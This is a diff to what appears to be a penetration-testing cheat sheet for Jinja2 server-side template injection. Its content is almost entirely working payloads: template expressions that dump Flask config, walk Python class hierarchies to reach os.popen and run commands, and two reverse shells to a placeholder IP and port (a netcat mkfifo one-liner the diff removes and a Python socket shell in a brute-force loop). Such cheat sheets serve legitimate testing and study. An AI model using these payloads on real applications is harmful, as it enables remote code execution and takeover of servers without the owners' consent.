@@ -19,6 +19,7 @@ Jinja2 supports templates for the format
 ```
 # print all config vars
 {{config}}
+{{self.__dict__}}
 {{config.items()}}
 
 # find the mro object[X] to list all subclasses
@@ -32,17 +33,17 @@ Jinja2 supports templates for the format
 {{ ''.__class__.__mro__[X].__subclasses__()[XXX]('id', shell=True, stdout=-1).communicate() }}
 ```
 
-## RCE
+## RCE Styles
 
 ```bash
 {{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
-{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']() }}
 
-# revshell
-{{ request.application.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc IP PORT >/tmp/f').read() }}
+{{ request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']() }}
+
+{{ "foo".__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("ls").read()}}
 ```
 
-### brute-RCE
+### brute-RCE (without guessing mro class)
 
 ```
 {% for x in ().class.base.subclasses() %}{% if "warning" in x.name %}{{x()._module.builtins['import']('os').popen("python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("IP",PORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/bash", "-i"]);'").read().zfill(417)}}{%endif%}{% endfor %}
@@ -90,3 +91,5 @@ Jinja2 supports templates for the format
 
 * [https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti) 
 * [https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee](https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee)
+* [https://chowdera.com/2020/12/20201221231521371q.html](https://chowdera.com/2020/12/20201221231521371q.html)
+* [https://secure-cookie.io/attacks/ssti/](https://secure-cookie.io/attacks/ssti/)
